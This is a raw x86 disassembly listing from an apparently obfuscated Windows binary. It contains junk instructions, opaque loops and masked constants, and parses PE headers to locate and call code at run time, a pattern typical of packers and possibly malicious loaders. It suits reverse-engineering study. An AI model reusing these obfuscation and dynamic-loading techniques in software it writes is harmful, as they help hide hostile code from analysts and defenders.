  4087d8:	push   0x5d39
  4087dd:	push   DWORD PTR [ebp-0x18]
  4087e0:	push   0x7a56
  4087e5:	call   DWORD PTR ds:0x443390
  4087eb:	cmp    DWORD PTR ds:0x448994,0x11
  4087f2:	jb     0x4087b9
  4087f8:	mov    ds:0x4452b0,eax
  4087fd:	mov    eax,DWORD PTR [ebp-0x20]
  408800:	xor    eax,esi
  408802:	inc    edx
  408803:	add    eax,edi
  408805:	movzx  edx,BYTE PTR ds:0x44b6e4
  40880c:	sub    edx,DWORD PTR ds:0x44898c
  408812:	mov    DWORD PTR ds:0x44b6e4,edx
  408818:	mov    ds:0x44541c,eax
  40881d:	mov    eax,DWORD PTR [ebp-0x18]
  408820:	or     DWORD PTR ds:0x41074b,0x6341
  40882a:	mov    edx,DWORD PTR ds:0x4452b0
  408830:	sbb    DWORD PTR ds:0x44899c,0x44b6e8
  40883a:	xor    eax,esi
  40883c:	sbb    DWORD PTR ds:0x44b6d4,0x68
  408846:	add    eax,edi
  408848:	mov    DWORD PTR ds:0x44b6e0,0x7dde
  408852:	cmp    edx,eax
  408854:	jne    0x40903b
  40885a:	mov    eax,DWORD PTR [ebp-0x18]
  40885d:	sbb    ebx,edx
  40885f:	mov    DWORD PTR [ebp-0x28],eax
  408862:	xor    eax,eax
  408864:	add    eax,DWORD PTR ds:0x4454e0
  40886a:	mov    ebx,DWORD PTR ds:0x4454ec
  408870:	sub    eax,ebx
  408872:	add    eax,DWORD PTR [eax+ebx*1]
  408875:	mov    eax,DWORD PTR [ebp-0x20]
  408878:	mov    DWORD PTR [ebp-0x1c],eax
  40887b:	mov    eax,ds:0x4451a0
  408880:	and    DWORD PTR ds:0x4489a4,0x0
  40888a:	mov    ebx,DWORD PTR ds:0x4489a4
  408890:	inc    ebx
  408891:	mov    DWORD PTR ds:0x4489a4,ebx
  408897:	cmp    DWORD PTR ds:0x4489a4,0x21
  40889e:	jne    0x4088b5
  4088a4:	push   0x32f9
  4088a9:	push   DWORD PTR [ebp-0x20]
  4088ac:	push   DWORD PTR [ebp-0x18]
  4088af:	call   DWORD PTR ds:0x4430f4
  4088b5:	cmp    DWORD PTR ds:0x4489a4,0x13
  4088bc:	jb     0x40888a
  4088c2:	mov    DWORD PTR ds:0x44b6e8,0x1c
  4088cc:	cmp    DWORD PTR ds:0x44b6e8,0x0
  4088d3:	je     0x408985
  4088d9:	cmp    DWORD PTR ds:0x44b6e8,0xe
  4088e0:	jne    0x4088ef
  4088e6:	push   DWORD PTR [ebp-0x24]
  4088e9:	call   DWORD PTR ds:0x4430f8
  4088ef:	cmp    DWORD PTR ds:0x44b6e8,0xf
  4088f6:	jne    0x40890b
  4088fc:	xor    edx,edx
  4088fe:	xor    edx,DWORD PTR ds:0x44b6e8
  408904:	dec    edx
  408905:	mov    DWORD PTR ds:0x44b6e8,edx
  40890b:	mov    edx,DWORD PTR ds:0x44b6e8
  408911:	dec    edx
  408912:	mov    DWORD PTR ds:0x44b6e8,edx
  408918:	jmp    0x4088cc
  40891d:	and    DWORD PTR ds:0x41073f,0x0
  408927:	jmp    0x40893b
  40892c:	xor    edx,edx
  40892e:	xor    edx,DWORD PTR ds:0x41073f
  408934:	inc    edx
  408935:	mov    DWORD PTR ds:0x41073f,edx
  40893b:	cmp    DWORD PTR ds:0x41073f,0x11
  408942:	jae    0x408985
  408948:	cmp    DWORD PTR ds:0x41073f,0x7
  40894f:	jne    0x40895e
  408955:	push   DWORD PTR [ebp-0xc]
  408958:	call   DWORD PTR ds:0x443394
  40895e:	cmp    DWORD PTR ds:0x41073f,0x6
  408965:	jne    0x40897a
  40896b:	xor    edx,edx
  40896d:	or     edx,DWORD PTR ds:0x41073f
  408973:	inc    edx
  408974:	mov    DWORD PTR ds:0x41073f,edx
  40897a:	jmp    0x40892c
  40897f:	xor    DWORD PTR ds:0x4489a8,ebx
  408985:	mov    eax,DWORD PTR [eax+0x198]
  40898b:	mov    DWORD PTR [ebp-0x8],eax
  40898e:	or     DWORD PTR ds:0x4489a4,0xc15
  408998:	mov    eax,DWORD PTR [ebp-0x1c]
  40899b:	mov    edx,DWORD PTR [ebp-0x8]
  40899e:	xor    ebx,0x1805
  4089a4:	xor    eax,esi
  4089a6:	dec    ebx
  4089a7:	add    eax,edi
  4089a9:	sbb    ebx,DWORD PTR ds:0x41074f
  4089af:	mov    DWORD PTR [edx],eax
  4089b1:	add    ebx,DWORD PTR ds:0x44b6d4
  4089b7:	lea    eax,[ebp-0x10]
  4089ba:	dec    ebx
  4089bb:	mov    DWORD PTR [ebp-0x34],eax
  4089be:	and    DWORD PTR ds:0x410757,0x0
  4089c8:	jmp    0x4089db
  4089cd:	xor    eax,eax
  4089cf:	or     eax,DWORD PTR ds:0x410757
  4089d5:	inc    eax
  4089d6:	mov    ds:0x410757,eax
  4089db:	cmp    DWORD PTR ds:0x410757,0x13
  4089e2:	jae    0x408a35
  4089e8:	cmp    DWORD PTR ds:0x410757,0x6
  4089ef:	jne    0x408a0d
  4089f5:	push   0x1b4e
  4089fa:	push   0x76a9
  4089ff:	push   DWORD PTR [ebp-0x1c]
  408a02:	push   0x886b
  408a07:	call   DWORD PTR ds:0x443398
  408a0d:	cmp    DWORD PTR ds:0x410757,0x5
  408a14:	jne    0x408a25
  408a1a:	mov    eax,ds:0x410757
  408a1f:	inc    eax
  408a20:	mov    ds:0x410757,eax
  408a25:	jmp    0x4089cd
  408a2a:	mov    eax,ds:0x44b6dc
  408a2f:	and    DWORD PTR ds:0x424848,eax
  408a35:	mov    eax,DWORD PTR [ebp-0x1c]
  408a38:	adc    edx,0x330f
  408a3e:	mov    edx,DWORD PTR [ebp-0x34]
  408a41:	sub    DWORD PTR ds:0x41074b,ebx
  408a47:	xor    eax,esi
  408a49:	mov    DWORD PTR ds:0x448980,0x18
  408a53:	cmp    DWORD PTR ds:0x448980,0x0
  408a5a:	je     0x408b05
  408a60:	cmp    DWORD PTR ds:0x448980,0x2
  408a67:	jne    0x408a82
  408a6d:	push   DWORD PTR [ebp-0x28]
  408a70:	push   DWORD PTR [ebp-0x20]
  408a73:	push   DWORD PTR [ebp-0x10]
  408a76:	push   DWORD PTR [ebp-0x1c]
  408a79:	push   DWORD PTR [ebp-0x28]
  408a7c:	call   DWORD PTR ds:0x4430fc
  408a82:	cmp    DWORD PTR ds:0x448980,0x3
  408a89:	jne    0x408a9e
  408a8f:	xor    ebx,ebx
  408a91:	xor    ebx,DWORD PTR ds:0x448980
  408a97:	dec    ebx
  408a98:	mov    DWORD PTR ds:0x448980,ebx
  408a9e:	xor    ebx,ebx
  408aa0:	add    ebx,DWORD PTR ds:0x448980
  408aa6:	dec    ebx
  408aa7:	mov    DWORD PTR ds:0x448980,ebx
  408aad:	jmp    0x408a53
  408ab2:	and    DWORD PTR ds:0x424844,0x0
  408abc:	jmp    0x408ace
  408ac1:	mov    ebx,DWORD PTR ds:0x424844
  408ac7:	inc    ebx
  408ac8:	mov    DWORD PTR ds:0x424844,ebx
  408ace:	cmp    DWORD PTR ds:0x424844,0x10
  408ad5:	jae    0x408b05
  408adb:	cmp    DWORD PTR ds:0x424844,0x19
  408ae2:	jne    0x408af3
  408ae8:	push   0x82d5
  408aed:	call   DWORD PTR ds:0x443100
  408af3:	jmp    0x408ac1
  408af8:	movzx  ebx,WORD PTR ds:0x410757
  408aff:	and    DWORD PTR ds:0x4489a8,ebx
  408b05:	add    eax,edi
  408b07:	adc    DWORD PTR ds:0x424850,0x6c9f
  408b11:	mov    DWORD PTR [edx],eax
  408b13:	mov    DWORD PTR [ebp-0x2c],ecx
  408b16:	lea    eax,[ebp-0x2c]
  408b19:	or     ebx,ebx
  408b1b:	mov    DWORD PTR [ebp-0x14],eax
  408b1e:	add    ebx,eax
  408b20:	mov    eax,DWORD PTR [ebp-0x2c]
  408b23:	sub    ebx,0x4e67
  408b29:	mov    ecx,DWORD PTR [ebp-0x14]
  408b2c:	xor    eax,esi
  408b2e:	adc    ebx,0x2698
  408b34:	add    eax,0x32729e
  408b39:	and    DWORD PTR ds:0x424858,0x0
  408b43:	mov    ebx,DWORD PTR ds:0x424858
  408b49:	inc    ebx
  408b4a:	mov    DWORD PTR ds:0x424858,ebx
  408b50:	cmp    DWORD PTR ds:0x424858,0xb
  408b57:	jne    0x408b68
  408b5d:	push   0x410870
  408b62:	call   DWORD PTR ds:0x443104
  408b68:	cmp    DWORD PTR ds:0x424858,0xa
  408b6f:	jne    0x408b82
  408b75:	mov    ebx,DWORD PTR ds:0x424858
  408b7b:	inc    ebx
  408b7c:	mov    DWORD PTR ds:0x424858,ebx
  408b82:	cmp    DWORD PTR ds:0x424858,0x19
  408b89:	jb     0x408b43
  408b8f:	adc    ebx,DWORD PTR ds:0x41074b
  408b95:	mov    DWORD PTR [ecx],eax
  408b97:	sub    DWORD PTR ds:0x44b6dc,0x6b19
  408ba1:	mov    eax,ds:0x445274
  408ba6:	sbb    ebx,0x4548
  408bac:	mov    DWORD PTR [ebp-0x24],0x8e12febe
  408bb3:	xor    DWORD PTR ds:0x448998,edx
  408bb9:	mov    eax,DWORD PTR [eax]
  408bbb:	xor    DWORD PTR ds:0x44b6d0,ebx
  408bc1:	mov    cx,WORD PTR [ebp-0x10]
  408bc5:	movzx  ecx,cx
  408bc8:	xor    ebx,DWORD PTR ds:0x410757
  408bce:	add    ecx,DWORD PTR [eax]
  408bd0:	mov    DWORD PTR [ebp-0x40],0xf89c8531
  408bd7:	mov    ebx,DWORD PTR ds:0x448994
  408bdd:	sub    DWORD PTR ds:0x44b6e0,ebx
  408be3:	mov    DWORD PTR [ebp-0x14],ecx
  408be6:	xor    ebx,ebx
  408be8:	mov    ebx,0x5a3fc9e
  408bed:	and    DWORD PTR ds:0x44898c,0x0
  408bf7:	mov    ecx,DWORD PTR ds:0x44898c
  408bfd:	inc    ecx
  408bfe:	mov    DWORD PTR ds:0x44898c,ecx
  408c04:	cmp    DWORD PTR ds:0x44898c,0x7
  408c0b:	jne    0x408c36
  408c11:	push   0x7083
  408c16:	push   0x1db3
  408c1b:	push   0x7eea
  408c20:	push   0x448984
  408c25:	push   DWORD PTR [ebp-0x14]
  408c28:	push   DWORD PTR [ebp-0x24]
  408c2b:	push   0x41089f
  408c30:	call   DWORD PTR ds:0x44339c
  408c36:	cmp    DWORD PTR ds:0x44898c,0x6
  408c3d:	jne    0x408c50
  408c43:	mov    ecx,DWORD PTR ds:0x44898c
  408c49:	inc    ecx
  408c4a:	mov    DWORD PTR ds:0x44898c,ecx
  408c50:	cmp    DWORD PTR ds:0x44898c,0x10
  408c57:	jb     0x408bf7
  408c5d:	mov    eax,DWORD PTR [ebp-0x1c]
  408c60:	mov    ecx,DWORD PTR [ebp-0x8]
  408c63:	xor    eax,esi
  408c65:	add    eax,edi
  408c67:	mov    DWORD PTR ds:0x410757,0x128d
  408c71:	cmp    DWORD PTR [ecx],eax
  408c73:	mov    DWORD PTR ds:0x424854,0x2c74
  408c7d:	jne    0x408de6
  408c83:	movzx  eax,BYTE PTR ds:0x410747
  408c8a:	adc    eax,DWORD PTR ds:0x410753
  408c90:	mov    ds:0x410747,eax
  408c95:	mov    eax,DWORD PTR [ebp-0x1c]
  408c98:	mov    ecx,DWORD PTR [ebp-0x14]
  408c9b:	or     DWORD PTR ds:0x44e424,0x44e420
  408ca5:	xor    eax,esi
  408ca7:	or     DWORD PTR ds:0x448988,0x44e428
  408cb1:	add    eax,edi
  408cb3:	mov    DWORD PTR ds:0x44899c,0x2417
  408cbd:	cmp    DWORD PTR [ecx],eax
  408cbf:	jne    0x408d21
  408cc5:	dec    edx
  408cc6:	mov    eax,DWORD PTR [ebp-0x1c]
  408cc9:	sbb    DWORD PTR ds:0x44e424,0x7bb6
  408cd3:	mov    ecx,DWORD PTR [ebp-0x34]
  408cd6:	adc    DWORD PTR ds:0x448990,ecx
  408cdc:	xor    eax,esi
  408cde:	xor    DWORD PTR ds:0x44e420,0x6611
  408ce8:	add    eax,edi
  408cea:	movzx  edx,WORD PTR ds:0x424840
  408cf1:	sbb    DWORD PTR ds:0x424848,edx
  408cf7:	mov    DWORD PTR [ecx],eax
  408cf9:	dec    ecx
  408cfa:	mov    eax,DWORD PTR [ebp-0x34]
  408cfd:	mov    ecx,DWORD PTR [ebp-0x40]
  408d00:	sbb    edx,DWORD PTR ds:0x44e420
  408d06:	xor    ecx,esi
  408d08:	adc    edx,DWORD PTR ds:0x4489a8
  408d0e:	mov    edx,0xffcd8d62
  408d13:	sbb    DWORD PTR ds:0x448984,0x448980
  408d1d:	sub    edx,ecx
  408d1f:	add    DWORD PTR [eax],edx
  408d21:	mov    DWORD PTR ds:0x410747,0x19
  408d2b:	cmp    DWORD PTR ds:0x410747,0x0
  408d32:	je     0x408d8e
  408d38:	cmp    DWORD PTR ds:0x410747,0x5
  408d3f:	jne    0x408d63
  408d45:	push   DWORD PTR [ebp-0x1c]
  408d48:	push   0x2684
  408d4d:	push   DWORD PTR [ebp-0x18]
  408d50:	push   DWORD PTR [ebp-0x28]
  408d53:	push   0x71f6
  408d58:	push   0x2f24
  408d5d:	call   DWORD PTR ds:0x4433a0
  408d63:	cmp    DWORD PTR ds:0x410747,0x6
  408d6a:	jne    0x408d7b
  408d70:	mov    eax,ds:0x410747
  408d75:	dec    eax
  408d76:	mov    ds:0x410747,eax
  408d7b:	xor    eax,eax
  408d7d:	or     eax,DWORD PTR ds:0x410747
  408d83:	dec    eax
  408d84:	mov    ds:0x410747,eax
  408d89:	jmp    0x408d2b
  408d8e:	mov    eax,ds:0x445274
  408d93:	mov    eax,DWORD PTR [eax]
  408d95:	mov    cx,WORD PTR [ebp-0x10]
  408d99:	movzx  ecx,cx
  408d9c:	add    ecx,DWORD PTR [eax]
  408d9e:	mov    DWORD PTR [ebp-0x14],ecx
  408da1:	mov    eax,DWORD PTR [ebp-0x28]
  408da4:	mov    ecx,DWORD PTR [ebp-0x28]
  408da7:	xor    eax,esi
  408da9:	lea    eax,[eax+eax*1+0x32729e]
  408db0:	xor    ecx,esi
  408db2:	sub    ecx,eax
  408db4:	mov    ax,WORD PTR [ebp-0x10]
  408db8:	movzx  eax,ax
  408dbb:	cmp    eax,ecx
  408dbd:	mov    eax,DWORD PTR [ebp-0x40]
  408dc0:	movzx  ecx,WORD PTR [ebp-0x10]
  408dc4:	jg     0x408dd9
  408dca:	xor    eax,esi
  408dcc:	sub    ecx,eax
  408dce:	sub    ecx,edi
  408dd0:	mov    WORD PTR [ebp-0x10],cx
  408dd4:	jmp    0x408de6
  408dd9:	xor    eax,esi
  408ddb:	lea    eax,[eax+ecx*1+0x32729e]
  408de2:	mov    WORD PTR [ebp-0x10],ax
  408de6:	mov    ecx,DWORD PTR [ebp-0x24]
  408de9:	mov    eax,0x8e12febe
  408dee:	cmp    ecx,eax
  408df0:	je     0x408e04
  408df6:	mov    eax,DWORD PTR [ebp-0x8]
  408df9:	mov    DWORD PTR [eax],0x60341e8d
  408dff:	jmp    0x40902a
  408e04:	mov    ecx,DWORD PTR [ebp-0x24]
  408e07:	cmp    ecx,0x5142ddbc
  408e0d:	jne    0x408e85
  408e13:	mov    eax,DWORD PTR [ebp-0x8]
  408e16:	mov    DWORD PTR [eax],0x4214febc
  408e1c:	mov    eax,DWORD PTR [ebp-0x8]
  408e1f:	mov    DWORD PTR [ebp-0xc],eax
  408e22:	mov    eax,DWORD PTR [ebp-0x28]
  408e25:	mov    eax,DWORD PTR [ebp-0x1c]
  408e28:	mov    DWORD PTR [ebp-0x3c],ebx
  408e2b:	mov    eax,DWORD PTR [ebp-0x3c]
  408e2e:	mov    DWORD PTR [ebp-0x4],0x4eb5
  408e35:	cmp    eax,ebx
  408e37:	jne    0x40902a
  408e3d:	mov    ax,WORD PTR [ebp-0x4]
  408e41:	mov    ecx,0x8a42
  408e46:	xor    ax,cx
  408e49:	mov    ecx,0x3b08
  408e4e:	add    ax,cx
  408e51:	mov    ecx,DWORD PTR [ebp-0xc]
  408e54:	movzx  eax,ax
  408e57:	not    eax
  408e59:	and    eax,DWORD PTR [ecx]
  408e5b:	mov    ecx,DWORD PTR [ebp-0xc]
  408e5e:	mov    DWORD PTR [ecx],eax
  408e60:	jmp    0x408e6c
  408e65:	xor    DWORD PTR [ebp-0x3c],0xe149ebe
  408e6c:	mov    ax,WORD PTR [ebp-0x4]
  408e70:	push   DWORD PTR [ebp-0xc]
  408e73:	call   0x407112
  408e78:	test   eax,eax
  408e7a:	je     0x408e65
  408e80:	jmp    0x40902a
  408e85:	mov    ecx,DWORD PTR [ebp-0x24]
  408e88:	cmp    ecx,0x1443fcbd
  408e8e:	jne    0x408ea2
  408e94:	mov    eax,DWORD PTR [ebp-0x8]
  408e97:	mov    DWORD PTR [eax],0x60062d8f
  408e9d:	jmp    0x40902a
  408ea2:	mov    ecx,DWORD PTR [ebp-0x24]
  408ea5:	cmp    ecx,eax
  408ea7:	jne    0x408faf
  408ead:	mov    eax,DWORD PTR [ebp-0x1c]
  408eb0:	mov    ecx,DWORD PTR [ebp-0x8]
  408eb3:	xor    eax,esi
  408eb5:	add    eax,edi
  408eb7:	cmp    DWORD PTR [ecx],eax
  408eb9:	je     0x408f3c
  408ebf:	mov    ecx,DWORD PTR [ebp-0x2c]
  408ec2:	mov    eax,DWORD PTR [ebp-0x8]
  408ec5:	mov    eax,DWORD PTR [eax]
  408ec7:	mov    eax,DWORD PTR [eax+0x3c]
  408eca:	lea    ecx,[ecx*8+0x78]
  408ed1:	add    eax,ecx
  408ed3:	mov    ecx,DWORD PTR [ebp-0x8]
  408ed6:	mov    ecx,DWORD PTR [ecx]
  408ed8:	mov    eax,DWORD PTR [eax+ecx*1]
  408edb:	mov    DWORD PTR [ebp-0x4],eax
  408ede:	mov    eax,DWORD PTR [ebp-0x1c]
  408ee1:	xor    eax,esi
  408ee3:	add    eax,edi
  408ee5:	mov    DWORD PTR [ebp-0xc],eax
  408ee8:	mov    eax,DWORD PTR [ebp-0x1c]
  408eeb:	mov    ecx,DWORD PTR [ebp-0x4]
  408eee:	xor    eax,esi
  408ef0:	add    eax,edi
  408ef2:	cmp    ecx,eax
  408ef4:	je     0x40902a
  408efa:	mov    eax,DWORD PTR [ebp-0x8]
  408efd:	mov    ecx,DWORD PTR [ebp-0x4]
  408f00:	add    ecx,DWORD PTR [eax]
  408f02:	mov    DWORD PTR [ebp-0xc],ecx
  408f05:	mov    eax,DWORD PTR [ebp-0xc]
  408f08:	mov    ecx,DWORD PTR [ebp-0x8]
  408f0b:	mov    eax,DWORD PTR [eax+0xc]
  408f0e:	mov    ecx,DWORD PTR [ecx]
  408f10:	mov    al,BYTE PTR [eax+ecx*1]
  408f13:	add    al,0x35
  408f15:	xor    al,0x49
  408f17:	cmp    al,0xc9
  408f19:	je     0x408f30
  408f1f:	mov    eax,DWORD PTR [ebp-0x1c]
  408f22:	mov    ecx,DWORD PTR [ebp-0x8]
  408f25:	xor    eax,esi
  408f27:	add    eax,edi
  408f29:	mov    DWORD PTR [ecx],eax
  408f2b:	jmp    0x40902a
  408f30:	xor    DWORD PTR [ebp-0x24],0x5fd8f
  408f37:	jmp    0x40902a
  408f3c:	mov    eax,DWORD PTR [ebp-0x8]
  408f3f:	mov    ecx,DWORD PTR [ebp-0x14]
  408f42:	mov    ecx,DWORD PTR [ecx]
  408f44:	mov    DWORD PTR [eax],ecx
  408f46:	mov    eax,DWORD PTR [ebp-0x8]
  408f49:	mov    DWORD PTR [ebp-0xc],eax
  408f4c:	mov    eax,DWORD PTR [ebp-0x28]
  408f4f:	mov    eax,DWORD PTR [ebp-0x1c]
  408f52:	mov    DWORD PTR [ebp-0x44],ebx
  408f55:	mov    eax,DWORD PTR [ebp-0x44]
  408f58:	mov    DWORD PTR [ebp-0x4],0x4eb5
  408f5f:	cmp    eax,ebx
  408f61:	jne    0x40902a
  408f67:	mov    ax,WORD PTR [ebp-0x4]
  408f6b:	mov    ecx,0x8a42
  408f70:	xor    ax,cx
  408f73:	mov    ecx,0x3b08
  408f78:	add    ax,cx
  408f7b:	mov    ecx,DWORD PTR [ebp-0xc]
  408f7e:	movzx  eax,ax
  408f81:	not    eax
  408f83:	and    eax,DWORD PTR [ecx]
  408f85:	mov    ecx,DWORD PTR [ebp-0xc]
  408f88:	mov    DWORD PTR [ecx],eax
  408f8a:	jmp    0x408f96
  408f8f:	xor    DWORD PTR [ebp-0x44],0xe149ebe
  408f96:	mov    ax,WORD PTR [ebp-0x4]
  408f9a:	push   DWORD PTR [ebp-0xc]
  408f9d:	call   0x407112
  408fa2:	test   eax,eax
  408fa4:	je     0x408f8f
  408faa:	jmp    0x40902a
  408faf:	mov    eax,DWORD PTR [ebp-0x24]
  408fb2:	cmp    eax,0x33450cad
  408fb7:	jne    0x40902a
  408fbd:	mov    eax,DWORD PTR [ebp-0x8]
  408fc0:	mov    DWORD PTR [eax],0x443dc9d
  408fc6:	mov    eax,DWORD PTR [ebp-0x8]
  408fc9:	mov    DWORD PTR [ebp-0xc],eax
  408fcc:	mov    eax,DWORD PTR [ebp-0x28]
  408fcf:	mov    eax,DWORD PTR [ebp-0x1c]
  408fd2:	mov    DWORD PTR [ebp-0x38],ebx
  408fd5:	mov    eax,DWORD PTR [ebp-0x38]
  408fd8:	mov    DWORD PTR [ebp-0x4],0x4eb5
  408fdf:	cmp    eax,ebx
  408fe1:	jne    0x40902a
  408fe7:	mov    ax,WORD PTR [ebp-0x4]
  408feb:	mov    ecx,0x8a42
  408ff0:	xor    ax,cx
  408ff3:	mov    ecx,0x3b08
  408ff8:	add    ax,cx
  408ffb:	mov    ecx,DWORD PTR [ebp-0xc]
  408ffe:	movzx  eax,ax
  409001:	not    eax
  409003:	and    eax,DWORD PTR [ecx]
  409005:	mov    ecx,DWORD PTR [ebp-0xc]
  409008:	mov    DWORD PTR [ecx],eax
  40900a:	jmp    0x409016
  40900f:	xor    DWORD PTR [ebp-0x38],0xe149ebe
  409016:	mov    ax,WORD PTR [ebp-0x4]
  40901a:	push   DWORD PTR [ebp-0xc]
  40901d:	call   0x407112
  409022:	test   eax,eax
  409024:	je     0x40900f
  40902a:	mov    eax,DWORD PTR [ebp-0x24]
  40902d:	cmp    eax,0x8e12febe
  409032:	je     0x408bed
  409038:	mov    eax,DWORD PTR [ebp-0x8]
  40903b:	mov    eax,ds:0x4451a0
  409040:	mov    eax,DWORD PTR [eax+0x18c]
  409046:	mov    eax,DWORD PTR [eax]
  409048:	mov    DWORD PTR [ebp-0x58],eax
  40904b:	mov    eax,0xf89c8531
  409050:	mov    DWORD PTR [ebp-0x14],eax
  409053:	mov    DWORD PTR [ebp-0x14],eax
  409056:	mov    DWORD PTR [ebp-0x14],eax
  409059:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  409060:	mov    DWORD PTR [ebp-0x4],eax
  409063:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  40906a:	mov    ebx,DWORD PTR [ebp-0x20]
  40906d:	xor    ebx,esi
  40906f:	add    ebx,edi
  409071:	jmp    0x4090ac
  409076:	mov    eax,DWORD PTR [ebp-0x18]
  409079:	xor    eax,esi
  40907b:	lea    eax,[eax+ebx*1+0x32729e]
  409082:	push   eax
  409083:	mov    eax,DWORD PTR [ebp-0x14]
  409086:	xor    eax,esi
  409088:	lea    eax,[ebp+eax*1+0x3272a6]
  40908f:	push   eax
  409090:	mov    eax,ds:0x4451a0
  409095:	push   DWORD PTR [eax+0x1bc]
  40909b:	call   0x402c35
  4090a0:	mov    eax,DWORD PTR [ebp-0x18]
  4090a3:	xor    eax,esi
  4090a5:	lea    ebx,[ebx+eax*1+0x32729e]
  4090ac:	mov    eax,DWORD PTR [ebp-0x18]
  4090af:	mov    ecx,DWORD PTR [ebp-0x18]
  4090b2:	xor    ecx,esi
  4090b4:	xor    eax,esi
  4090b6:	add    eax,ecx
  4090b8:	mov    ecx,DWORD PTR [ebp-0x18]
  4090bb:	xor    ecx,esi
  4090bd:	lea    eax,[eax+ecx*1+0x9757da]
  4090c4:	cmp    ebx,eax
  4090c6:	jbe    0x409076
  4090cc:	mov    eax,DWORD PTR [ebp+0xc]
  4090cf:	mov    ds:0x445024,eax
  4090d4:	mov    eax,DWORD PTR [ebp+0x10]
  4090d7:	mov    ds:0x445278,eax
  4090dc:	mov    eax,ds:0x445024
  4090e1:	mov    ecx,DWORD PTR [ebp-0x30]
  4090e4:	sub    eax,edi
  4090e6:	xor    eax,esi
  4090e8:	mov    DWORD PTR [ecx],eax
  4090ea:	mov    eax,DWORD PTR [ebp-0x4c]
  4090ed:	cmp    eax,0xf89c8534
  4090f2:	je     0x40914f
  4090f8:	mov    eax,DWORD PTR [ebp-0x20]
  4090fb:	mov    ecx,DWORD PTR [ebp-0x54]
  4090fe:	xor    eax,esi
  409100:	add    eax,edi
  409102:	cmp    eax,ecx
  409104:	je     0x40914f
  40910a:	mov    eax,ds:0x4451a0
  40910f:	mov    eax,DWORD PTR [eax+0x194]
  409115:	mov    ecx,DWORD PTR [eax]
  409117:	mov    eax,DWORD PTR [ecx+0x3c]
  40911a:	push   DWORD PTR ds:0x445278
  409120:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  409124:	push   DWORD PTR ds:0x445024
  40912a:	add    eax,ecx
  40912c:	mov    ecx,DWORD PTR ds:0x4451a0
  409132:	mov    ecx,DWORD PTR [ecx+0x194]
  409138:	push   DWORD PTR [ecx]
  40913a:	call   eax
  40913c:	mov    ecx,DWORD PTR ds:0x4451a0
  409142:	mov    ecx,DWORD PTR [ecx+0x1cc]
  409148:	mov    DWORD PTR [ecx],eax
  40914a:	jmp    0x409276
  40914f:	mov    eax,DWORD PTR [ebp-0x20]
  409152:	mov    ecx,DWORD PTR [ebp-0x58]
  409155:	xor    eax,esi
  409157:	add    eax,edi
  409159:	cmp    eax,ecx
  40915b:	jne    0x409259
  409161:	mov    eax,DWORD PTR [ebp-0x20]
  409164:	xor    eax,esi
  409166:	add    eax,edi
  409168:	mov    ds:0x445224,eax
  40916d:	mov    eax,DWORD PTR [ebp-0x20]
  409170:	xor    eax,esi
  409172:	add    eax,edi
  409174:	mov    ds:0x44521c,eax
  409179:	mov    eax,DWORD PTR [ebp-0x18]
  40917c:	mov    DWORD PTR [ebp-0x14],eax
  40917f:	mov    eax,DWORD PTR [ebp-0x20]
  409182:	mov    DWORD PTR [ebp+0xc],eax
  409185:	mov    eax,DWORD PTR [ebp+0xc]
  409188:	xor    eax,esi
  40918a:	add    eax,edi
  40918c:	mov    DWORD PTR [ebp+0xc],eax
  40918f:	mov    eax,ds:0x445020
  409194:	mov    eax,DWORD PTR [eax]
  409196:	mov    DWORD PTR [ebp+0xc],eax
  409199:	mov    eax,ds:0x445228
  40919e:	mov    eax,DWORD PTR [eax]
  4091a0:	mov    DWORD PTR [ebp-0x30],eax
  4091a3:	mov    DWORD PTR [ebp+0x10],0xf89c8735
  4091aa:	mov    eax,DWORD PTR [ebp+0x10]
  4091ad:	xor    eax,esi
  4091af:	add    eax,edi
  4091b1:	mov    DWORD PTR [ebp+0x10],eax
  4091b4:	mov    eax,ds:0x4451a0
  4091b9:	mov    DWORD PTR [ebp+0x10],eax
  4091bc:	mov    eax,DWORD PTR [ebp+0xc]
  4091bf:	mov    DWORD PTR [ebp+0xc],eax
  4091c2:	mov    eax,DWORD PTR [ebp+0xc]
  4091c5:	push   0x4
  4091c7:	pop    ecx
  4091c8:	sub    ecx,eax
  4091ca:	add    ecx,DWORD PTR [ebp-0x30]
  4091cd:	mov    DWORD PTR [ebp-0x4],0xf89c85f5
  4091d4:	mov    DWORD PTR [ebp+0x10],ecx
  4091d7:	mov    DWORD PTR [ebp-0xa0],0xf89c8531
  4091e1:	mov    eax,DWORD PTR [ebp+0xc]
  4091e4:	mov    DWORD PTR [ebp-0x9c],eax
  4091ea:	mov    eax,DWORD PTR [ebp+0x10]
  4091ed:	mov    DWORD PTR [ebp-0x98],eax
  4091f3:	mov    eax,DWORD PTR [ebp-0x4]
  4091f6:	xor    eax,esi
  4091f8:	add    eax,edi
  4091fa:	mov    DWORD PTR [ebp-0x94],eax
  409200:	lea    eax,[ebp-0x5c]
  409203:	mov    DWORD PTR [ebp-0x90],eax
  409209:	mov    eax,DWORD PTR [ebp-0xa0]
  40920f:	xor    eax,esi
  409211:	add    eax,edi
  409213:	mov    DWORD PTR [ebp-0xa0],eax
  409219:	lea    eax,[ebp-0xa0]
  40921f:	push   eax
  409220:	mov    eax,DWORD PTR [ebp-0x14]
  409223:	xor    eax,esi
  409225:	add    eax,edi
  409227:	push   eax
  409228:	mov    eax,ds:0x4451c0
  40922d:	push   0x445116
  409232:	push   DWORD PTR [eax]
  409234:	call   0x40101c
  409239:	xor    esi,esi
  40923b:	mov    eax,DWORD PTR [ebp+0x10]
  40923e:	sub    eax,esi
  409240:	push   eax
  409241:	mov    eax,DWORD PTR [ebp+0xc]
  409244:	add    eax,esi
  409246:	push   eax
  409247:	call   0x40354e
  40924c:	inc    esi
  40924d:	cmp    esi,0x52
  409250:	jb     0x40923b
  409256:	mov    eax,DWORD PTR [ebp-0x14]
  409259:	call   0x405b6e
  40925e:	lea    eax,[ebp+0x4]
  409261:	mov    DWORD PTR [ebp-0x50],eax
  409264:	mov    eax,DWORD PTR [ebp-0x48]
  409267:	mov    eax,DWORD PTR [ebp-0x18]
  40926a:	push   DWORD PTR [ebp-0x20]
  40926d:	lea    eax,[ebp-0x50]
  409270:	push   eax
  409271:	call   0x40324f
  409276:	mov    eax,ds:0x4451a0
  40927b:	push   0x4
  40927d:	add    eax,0x1cc
  409282:	push   eax
  409283:	lea    eax,[ebp-0x48]
  409286:	push   eax
  409287:	call   0x402c35
  40928c:	mov    eax,DWORD PTR [ebp-0x48]
  40928f:	mov    eax,DWORD PTR [eax]
